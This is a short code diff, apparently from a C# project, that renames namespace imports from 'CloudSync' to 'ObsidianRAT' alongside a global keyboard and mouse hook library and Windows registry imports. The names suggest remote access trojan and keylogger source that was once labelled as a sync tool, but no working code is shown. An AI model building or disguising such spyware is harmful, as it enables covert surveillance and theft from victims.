@@ -1,6 +1,6 @@
-using CloudSync.Services.Modules;
-using CloudSync.Services.Modules.Stream;
-using CloudSync.Services.Core;
+using ObsidianRAT.Services.Modules;
+using ObsidianRAT.Services.Modules.Stream;
+using ObsidianRAT.Services.Core;
 using Gma.System.MouseKeyHook;
 using Imagekit.Sdk;
 using Microsoft.Win32;
